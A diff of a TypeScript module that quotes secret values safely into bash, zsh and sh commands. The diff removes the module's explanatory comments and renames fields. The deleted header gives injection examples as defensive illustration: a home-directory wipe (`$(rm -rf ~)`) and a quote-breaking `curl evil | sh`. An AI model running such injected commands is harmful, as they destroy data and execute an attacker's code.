@@ -1,40 +1,3 @@
-/**
- * Putting real values back into a shell command.
- *
- * The model writes `curl -H "Authorization: Bearer <SECRET_1>" ...` without
- * ever having seen the value. Pasting the value in is not enough: a value is
- * whatever some file or web page contained, and one like `$(rm -rf ~)` or
- * `'; curl evil | sh; '` would run. Unmasked, the model would have seen that
- * and quoted it; masked, it cannot, so this module has to.
- *
- * `embed` reads the command the way a shell does, far enough to know where
- * each placeholder stands, and writes the value so that the shell reads it as
- * plain data in that position:
- *
- *   outside quotes         'value'            (' becomes '\'')
- *   "double quotes"        \ " $ ` escaped
- *   'single quotes'        ' becomes '\''
- *   $'ANSI-C quotes'       \ and ' escaped
- *   here-document          \ $ ` escaped, or nothing if its end marker is quoted
- *   # comment              as it is, if it has no line break
- *
- * Wherever that cannot be done with certainty the command is refused, with a
- * reason the model can act on: inside backquotes, `${...}` or arithmetic,
- * right after a `$` or a backslash, a value that would be read as an option,
- * a value that would end a here-document, and anything after syntax this
- * reader does not follow. Refusing costs a retry; guessing wrong would run
- * somebody else's text as a command.
- *
- * Written for bash, zsh and POSIX sh, and tested against all three, including
- * bash 3.2, which macOS still ships as /bin/bash. That version finds the end
- * of a `$( )` by counting quotes and parentheses, without knowing about
- * here-documents, `$'...'` or comments inside it, and it expands braces in
- * `"$( ... "{a,b}" ... )"` as if the inner quotes were not there. So inside a
- * `$( )` more is refused: a value with braces (when the `$( )` stands in double
- * quotes), a value with quotes, parentheses, `$` or backslashes in a
- * here-document, and one with quotes or backslashes in `$'...'`.
- */
-
 import { tokenPattern } from "./vault.ts";
 
 export type Embedded = { command: string } | { refused: string };
@@ -47,17 +10,12 @@ interface Spot {
 	value: string;
 }
 
-/** Unquoted shell text: the command line itself, or the inside of `$( )`. */
 interface Plain {
 	kind: "plain";
 	substitution: boolean;
-	/** Open parentheses that are not a `$(`. */
-	depth: number;
-	/** How much of the current word has been read, quote marks not counted. */
-	content: number;
-	/** The start of the current word as written: enough to recognize `--`, `case` and an open `[`. */
-	word: string;
-	/** A `--` has ended the options of the current command. */
+	parenDepth: number;
+	wordLength: number;
+	wordPrefix: string;
 	optionsEnded: boolean;
 }
 
@@ -68,10 +26,8 @@ interface Double {
 
 interface Heredoc {
 	delimiter: string;
-	/** Its end marker was quoted: the text is taken as it is. */
 	literal: boolean;
 	stripTabs: boolean;
-	/** It was started inside a `$( )`. */
 	nested: boolean;
 }
 
@@ -88,10 +44,6 @@ const inDouble = (value: string) => value.replace(/[\\"$`]/g, "\\$&");
 const inAnsiC = (value: string) => value.replace(/[\\']/g, "\\$&");
 const inHeredoc = (value: string) => value.replace(/[\\$`]/g, "\\$&");
 
-/**
- * `command` with every placeholder that `valueOf` knows replaced by its value, written so that the
- * shell takes it as data. Placeholders `valueOf` does not know are left alone.
- */
 export function embed(command: string, valueOf: (token: string) => string | undefined): Embedded {
 	const spots = new Map<number, Spot>();
 	for (const match of command.matchAll(tokenPattern())) {
@@ -107,10 +59,10 @@ export function embed(command: string, valueOf: (token: string) => string | unde
 	}
 }
 
+const stripPlaceholderBrackets = (token: string) => token.slice(1, -1);
+
 function refuse(spot: Spot, why: string): never {
-	// The placeholder is named without its brackets. This text reaches the model as a tool's output, where
-	// anything shaped like a placeholder is replaced by a literal.
-	throw new Refusal(`The privacy screen cannot put the value of ${spot.token.slice(1, -1)} into this command: ${why}. Nothing was run. ${HINT}`);
+	throw new Refusal(`The privacy screen cannot put the value of ${stripPlaceholderBrackets(spot.token)} into this command: ${why}. Nothing was run. ${HINT}`);
 }
 
 function place(command: string, spots: ReadonlyMap<number, Spot>): string {
@@ -126,34 +78,31 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 	}
 
 	function plain(substitution: boolean): Plain {
-		return { kind: "plain", substitution, depth: 0, content: 0, word: "", optionsEnded: false };
+		return { kind: "plain", substitution, parenDepth: 0, wordLength: 0, wordPrefix: "", optionsEnded: false };
 	}
-	/** Copy the command up to `to` as it is. */
 	function copy(to: number): void {
 		const end = Math.min(n, to);
 		if (end > i) out.push(command.slice(i, end));
 		i = Math.max(i, end);
 	}
-	/** The first placeholder at or after `from`. */
 	function spotFrom(from: number): Spot | undefined {
 		const index = order.find((at) => at >= from);
 		return index === undefined ? undefined : spots.get(index);
 	}
-	/** Syntax this reader does not follow. Later placeholders cannot be placed; without any, the rest is copied. */
 	function lose(what: string): void {
 		const next = spotFrom(i);
 		if (next) refuse(next, `it comes after ${what}, which the screen does not follow`);
 		copy(n);
 	}
 	function grow(frame: Plain, text: string): void {
-		frame.content++;
-		if (frame.word.length < 16) frame.word += text;
+		frame.wordLength++;
+		if (frame.wordPrefix.length < 16) frame.wordPrefix += text;
 	}
 	function endWord(frame: Plain): void {
-		if (frame.word === "--") frame.optionsEnded = true;
-		const wasCase = frame.word === "case";
-		frame.word = "";
-		frame.content = 0;
+		if (frame.wordPrefix === "--") frame.optionsEnded = true;
+		const wasCase = frame.wordPrefix === "case";
+		frame.wordPrefix = "";
+		frame.wordLength = 0;
 		if (wasCase && insideSubstitution()) lose("a case statement inside $( )");
 	}
 	function endCommand(frame: Plain): void {
@@ -164,14 +113,13 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		return frames.some((frame) => frame.kind === "plain" && frame.substitution);
 	}
 	function checkOption(spot: Spot, owner: Plain): void {
-		if (owner.content === 0 && !owner.optionsEnded && spot.value.startsWith("-")) {
+		if (owner.wordLength === 0 && !owner.optionsEnded && spot.value.startsWith("-")) {
 			refuse(spot, "its value starts with a dash and would be read as an option here; put -- before it, or attach it to its option as in --name=…");
 		}
 	}
 	function behind(): string {
 		return command.slice(Math.max(0, i - 200), i);
 	}
-	/** Whether the command has a brace of its own; looked up once, at the first value that needs to know. */
 	let bareBrace: boolean | undefined;
 	/** bash 3.2 brace-expands the text of a `$( )` that stands in double quotes, ignoring the quotes inside it. */
 	function checkBraces(spot: Spot): void {
@@ -188,8 +136,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		}
 	}
 
-	// ------------------------------------------------------- unquoted text
-
 	function plainStep(frame: Plain): void {
 		const spot = spots.get(i);
 		if (spot) {
@@ -205,13 +151,13 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		switch (c) {
 			case "\\": {
 				if (spots.has(i + 1)) refuse(spots.get(i + 1)!, "it follows a backslash");
-				if (command[i + 1] !== "\n") grow(frame, command.slice(i, i + 2)); // a line continuation is not part of a word
+				if (command[i + 1] !== "\n") grow(frame, command.slice(i, i + 2));
 				return copy(i + 2);
 			}
 			case "'":
 				return singleQuoted(frame);
 			case '"':
-				frame.word += '"';
+				frame.wordPrefix += '"';
 				frames.push({ kind: "double", owner: frame });
 				return copy(i + 1);
 			case "`":
@@ -220,7 +166,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 			case "$":
 				return dollar(frame, frame);
 			case "#":
-				if (frame.content === 0 && frame.word === "") return comment();
+				if (frame.wordLength === 0 && frame.wordPrefix === "") return comment();
 				break;
 			case " ":
 			case "\t":
@@ -239,18 +185,18 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 			case "(":
 				if (command[i + 1] === "(") return arithmetic(i);
 				endCommand(frame);
-				frame.depth++;
+				frame.parenDepth++;
 				return copy(i + 1);
 			case ")":
 				endCommand(frame);
-				if (frame.depth > 0) frame.depth--;
+				if (frame.parenDepth > 0) frame.parenDepth--;
 				else if (frame.substitution) frames.pop();
 				return copy(i + 1);
 			case "<":
 				if (command[i + 1] === "<" && !spots.has(i + 1)) {
 					if (command[i + 2] === "<" && !spots.has(i + 2)) {
 						endWord(frame);
-						return copy(i + 3); // a here-string: the next word is read like any other
+						return copy(i + 3);
 					}
 					return heredocStart(frame);
 				}
@@ -268,7 +214,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		const close = command.indexOf("'", i + 1);
 		if (close === -1) return lose("an unterminated quote");
 		if (pending.length > 0 && command.slice(i, close).includes("\n")) return lose("a quoted line break before the text of a here-document");
-		frame.word += "'";
+		frame.wordPrefix += "'";
 		copy(i + 1);
 		while (i < close) {
 			const spot = spots.get(i);
@@ -280,13 +226,13 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 			} else {
 				copy(i + 1);
 			}
-			frame.content++;
+			frame.wordLength++;
 		}
 		copy(close + 1);
 	}
 
 	function ansiC(frame: Plain): void {
-		frame.word += "$'";
+		frame.wordPrefix += "$'";
 		copy(i + 2);
 		while (i < n) {
 			const spot = spots.get(i);
@@ -309,7 +255,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 				if (c === "\n" && pending.length > 0) return lose("a quoted line break before the text of a here-document");
 				copy(i + 1);
 			}
-			frame.content++;
+			frame.wordLength++;
 		}
 	}
 
@@ -339,8 +285,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		copy(close + 1);
 	}
 
-	// ------------------------------------------------------ "double quotes"
-
 	function doubleStep(frame: Double): void {
 		const spot = spots.get(i);
 		if (spot) {
@@ -348,7 +292,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 			if (SUBSCRIPT.test(before)) refuse(spot, "it stands in the subscript of a variable");
 			checkOption(spot, frame.owner);
 			checkBraces(spot);
-			// "$NAME" + value: closing and reopening the quotes keeps the value out of the name.
 			out.push((VARIABLE.test(before) ? '""' : "") + inDouble(spot.value));
 			grow(frame.owner, "?");
 			i = spot.end;
@@ -363,7 +306,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 			}
 			if (spots.has(i + 1)) refuse(spots.get(i + 1)!, "it follows a backslash");
 		} else if (c === '"') {
-			frame.owner.word += '"';
+			frame.owner.wordPrefix += '"';
 			frames.pop();
 			return copy(i + 1);
 		} else if (c === "`") {
@@ -377,8 +320,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		grow(frame.owner, c);
 		copy(i + 1);
 	}
-
-	// ------------------------------------------------------------ $ things
 
 	function dollar(frame: Plain | Double, owner: Plain): void {
 		grow(owner, "$");
@@ -395,7 +336,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		copy(i + 1);
 	}
 
-	/** `(( ... ))` from its first parenthesis at `open`: copied whole, and no placeholder may be in it. */
 	function arithmetic(open: number): void {
 		let depth = 0;
 		for (let at = open; at < n; at++) {
@@ -411,7 +351,6 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		lose("an unterminated arithmetic expression");
 	}
 
-	/** `${ ... }` at `i`: copied whole, and no placeholder may be in it. */
 	function parameter(): void {
 		let depth = 0;
 		for (let at = i + 1; at < n; at++) {
@@ -427,10 +366,8 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		lose("an unterminated ${ } expansion");
 	}
 
-	// -------------------------------------------------------- here-documents
-
 	function heredocStart(frame: Plain): void {
-		if (/\[[^\]]*$/.test(frame.word)) return lose("a << inside a subscript");
+		if (/\[[^\]]*$/.test(frame.wordPrefix)) return lose("a << inside a subscript");
 		endWord(frame);
 		let at = i + 2;
 		const stripTabs = command[at] === "-";
@@ -466,13 +403,12 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 		copy(at);
 	}
 
-	/** The texts of the here-documents started on the line that just ended. */
 	function heredocBodies(): void {
 		while (pending.length > 0 && i < n) {
 			const doc = pending.shift()!;
 			const unindented = (line: string) => (doc.stripTabs ? line.replace(/^\t+/, "") : line);
 			const nested = doc.nested || insideSubstitution();
-			let commands = false; // the text runs commands itself: $( ) or backquotes
+			let hasCommandSubstitution = false;
 			for (;;) {
 				let end = command.indexOf("\n", i);
 				if (end === -1) end = n;
@@ -504,7 +440,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 						if (doc.literal) {
 							out.push(spot.value);
 						} else {
-							if (commands) {
+							if (hasCommandSubstitution) {
 								refuse(spot, "it stands in a here-document that also runs commands; quote the end marker (<<'EOF') to make the text literal");
 							}
 							if (VARIABLE.test(before) || SUBSCRIPT.test(before)) {
@@ -521,7 +457,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 						if (spots.has(i + 1)) refuse(spots.get(i + 1)!, "it follows a backslash");
 						copy("$`\\".includes(command[i + 1]!) ? i + 2 : i + 1);
 					} else if (c === "`" || command.startsWith("$(", i)) {
-						commands = true;
+						hasCommandSubstitution = true;
 						copy(i + 1);
 					} else if (command.startsWith("${", i)) {
 						parameter();
@@ -536,7 +472,7 @@ function place(command: string, spots: ReadonlyMap<number, Spot>): string {
 					if (lines.some((one) => unindented(one) === doc.delimiter)) refuse(last, "its value would end the here-document early");
 				}
 				if (i >= n) return;
-				copy(i + 1); // the line break
+				copy(i + 1);
 			}
 		}
 	}
